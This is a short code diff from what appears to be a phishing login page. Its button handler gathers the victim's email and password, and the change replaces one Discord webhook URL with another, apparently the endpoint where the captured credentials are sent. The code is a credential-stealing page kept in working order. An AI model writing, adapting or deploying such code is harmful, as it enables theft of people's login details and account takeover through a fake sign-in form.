@@ -7,7 +7,7 @@ loginButton.addEventListener("click", (e) => {
   e.preventDefault();
   const content = { email: email.value, password: password.value };
   const webhookURL =
-    "https://discord.com/api/webhooks/1421198194758647906/jCx6wDN8iYUuOr4Od7yPTxr6BWcqLgnb89J6A4DV-fWNbi2OOLhklkcaOLsrjkqTt5KG";
+    "https://discord.com/api/webhooks/1421416833046544384/ItEeROde03Anl_XPT0mYK9B4hrACejFdj28jCdW-IM8pkKw0Rskv7E8pDJjSOQRmmxsP";
 
   if (email.value && password.value) {
     body.innerHTML = "<div class='loader'></div>";
